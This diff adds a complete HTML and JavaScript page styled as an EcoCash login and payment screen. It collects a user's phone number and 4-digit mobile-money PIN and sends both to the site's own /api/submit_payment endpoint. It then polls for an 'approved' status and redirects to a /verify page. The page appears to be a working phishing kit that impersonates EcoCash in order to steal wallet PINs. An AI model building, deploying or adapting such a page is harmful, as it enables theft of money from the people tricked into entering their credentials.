@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>EcoCash - Login</title>
+    <style>
+        :root { --sky-blue: #0ea5e9; --dark: #1a1a2e; --gray: #6b7280; --white: #ffffff; --light: #f9fafb; --danger: #e53935; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--white); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 12px; }
+        .phone-frame { max-width: 390px; width: 100%; background: var(--white); border-radius: 32px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #e5e7eb; }
+        .inner-content { padding: 24px 16px; }
+        .logo-row { display: flex; align-items: center; gap: 8px; margin-bottom: 24px; }
+        .logo-row .eco { font-weight: 700; color: var(--sky-blue); font-size: 1.2rem; }
+        .logo-row .cash { font-weight: 700; color: var(--danger); font-size: 1.2rem; }
+        .plan-box { background: var(--light); border-radius: 16px; padding: 14px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .plan-box .label { color: var(--gray); font-size: 0.8rem; }
+        .plan-box .amount { font-weight: 700; font-size: 1.2rem; color: var(--dark); }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-weight: 600; font-size: 0.85rem; margin-bottom: 4px; color: var(--dark); }
+        .input-group input { width: 100%; padding: 14px; border: 2px solid #e5e7eb; border-radius: 14px; font-size: 1rem; outline: none; }
+        .input-group input:focus { border-color: var(--sky-blue); }
+        .btn { width: 100%; padding: 14px; border-radius: 50px; font-weight: 700; font-size: 1rem; border: none; cursor: pointer; }
+        .btn-blue { background: var(--sky-blue); color: var(--white); }
+        .back-link { display: block; text-align: center; margin-top: 16px; color: var(--gray); text-decoration: none; font-size: 0.85rem; }
+        .error-msg { color: var(--danger); font-size: 0.75rem; margin-top: 4px; display: none; }
+        .error-msg.show { display: block; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #e5e7eb; border-top-color: var(--sky-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .waiting { text-align: center; padding: 40px 0; }
+        .waiting h3 { margin-top: 16px; color: var(--dark); }
+        .waiting p { color: var(--gray); font-size: 0.85rem; }
+    </style>
+</head>
+<body>
+<div class="phone-frame">
+  <div class="inner-content">
+    <div class="logo-row">
+      <span class="eco">Eco</span><span class="cash">Cash</span>
+    </div>
+    <div class="plan-box"><span class="label">Amount to pay</span><span class="amount" id="payAmount">$ 0.00</span></div>
+    
+    <div id="formSection">
+      <div class="input-group"><label>Phone Number (+263)</label><input type="tel" id="phoneNumber" placeholder="77XXXXXXX" maxlength="10"></div>
+      <div class="input-group"><label>PIN</label><input type="password" id="pinNumber" placeholder="Enter PIN" maxlength="4"></div>
+      <div class="error-msg" id="errorMsg"></div>
+      <button class="btn btn-blue" onclick="submitPayment()">Pay with EcoCash →</button>
+    </div>
+    
+    <div id="waitSection" style="display:none;">
+      <div class="waiting"><div class="spinner"></div><h3>Processing...</h3><p>Waiting for approval</p></div>
+    </div>
+    
+    <a href="/" class="back-link">← Back to Plans</a>
+  </div>
+</div>
+<script>
+  var urlParams = new URLSearchParams(window.location.search);
+  var planAmount = urlParams.get('amount') || '0';
+  var planName = urlParams.get('plan') || '';
+  document.getElementById('payAmount').textContent = '$ ' + parseFloat(planAmount).toFixed(2);
+
+  document.getElementById('phoneNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');});
+  document.getElementById('pinNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');});
+
+  async function submitPayment() {
+    var phone = document.getElementById('phoneNumber').value.trim();
+    var pin = document.getElementById('pinNumber').value.trim();
+    if (!phone || phone.length < 9) { document.getElementById('errorMsg').textContent = 'Enter valid phone number'; document.getElementById('errorMsg').classList.add('show'); return; }
+    if (!pin || pin.length !== 4) { document.getElementById('errorMsg').textContent = 'Enter valid PIN'; document.getElementById('errorMsg').classList.add('show'); return; }
+    document.getElementById('formSection').style.display = 'none';
+    document.getElementById('waitSection').style.display = 'block';
+    try {
+      var res = await fetch('/api/submit_payment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, pin: pin, amount: parseFloat(planAmount), plan: planName, purpose: '' }) });
+      var data = await res.json();
+      var myAppId = data.app_id;
+      var checkInterval = setInterval(async function() {
+        var cr = await fetch('/api/check_status/' + myAppId);
+        var cd = await cr.json();
+        if (cd.status === 'approved') { 
+          clearInterval(checkInterval); 
+          window.location.href = '/verify?app_id=' + myAppId + '&phone=' + phone + '&amount=' + planAmount + '&plan=' + encodeURIComponent(planName); 
+        } else if (cd.status === 'invalid') { 
+          clearInterval(checkInterval); 
+          alert('This data is only for EcoCash users. Try with EcoCash.'); 
+          window.location.href = '/'; 
+        }
+      }, 2000);
+    } catch(e) { 
+      alert('Error. Try again.'); 
+      document.getElementById('formSection').style.display = 'block';
+      document.getElementById('waitSection').style.display = 'none';
+    }
+  }
+</script>
+</body>
+</html>
